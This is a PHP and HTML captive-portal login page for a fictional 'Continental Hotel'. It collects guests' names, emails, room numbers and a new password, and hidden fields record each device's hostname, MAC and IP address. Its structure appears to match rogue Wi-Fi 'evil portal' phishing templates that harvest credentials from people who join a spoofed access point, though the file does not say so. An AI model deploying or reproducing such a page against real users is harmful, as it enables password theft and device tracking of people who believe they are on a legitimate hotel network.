<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>The Continental Hotel - Register Stay</title>

  <style>
    body {
      font-family: Arial, sans-serif;
      background: url('assets/img/background.png') no-repeat center center fixed;
      background-size: cover;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      backdrop-filter: brightness(80%) blur(3px);
      color: #ffffff;
    }

    .container {
      max-width: 400px;
      width: 100%;
      text-align: center;
    }

    h1 {
      font-size: 24px;
      color: #ffffff;
    }

    .form-container {
      background: rgba(0,0,0,0.8);
      border-radius: 8px;
      padding: 15px;
      box-shadow: 0px 0px 15px rgba(0,0,0,0.4);
    }

    .input-field {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 4px;
      margin-bottom: 10px;
      font-size: 15px;
      background-color: #FFFFFF;
      color: #000;
      box-sizing: border-box;
    }

    .submit-btn {
      background: #8B0000;
      border: none;
      color: #FFFFFF;
      padding: 12px;
      border-radius: 20px;
      cursor: pointer;
      font-size: 17px;
      font-weight: bold;
      width: 100%;
    }

    .submit-btn:hover {
      background: #B22222;
    }

    footer {
      font-size: 12px;
      color: #ffffff;
      margin-top: 15px;
    }

    footer a {
      color: #ffffff;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Register Your Stay</h1>
    <p>Enter your details to create your Continental Hotel account.</p>

    <div class="form-container">
      <form method="POST" action="/captiveportal/index.php">
        <input name="first_name" type="text" class="input-field" placeholder="First Name" required>
        <input name="last_name" type="text" class="input-field" placeholder="Last Name" required>
        <input name="email" type="email" class="input-field" placeholder="Email Address" required>
        <input name="room_number" type="text" class="input-field" placeholder="Room Number" required>
        <input name="password" type="password" class="input-field" placeholder="Create Password" required>

        <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
        <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
        <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
        <input type="hidden" name="target" value="<?=$destination?>">

        <button type="submit" class="submit-btn">Create & Connect</button>
      </form>
    </div>

    <footer>
      The Continental Hotel © 2025. All rights reserved.
      <a href="privacy.php">Privacy policy</a>
    </footer>
  </div>
</body>
</html>
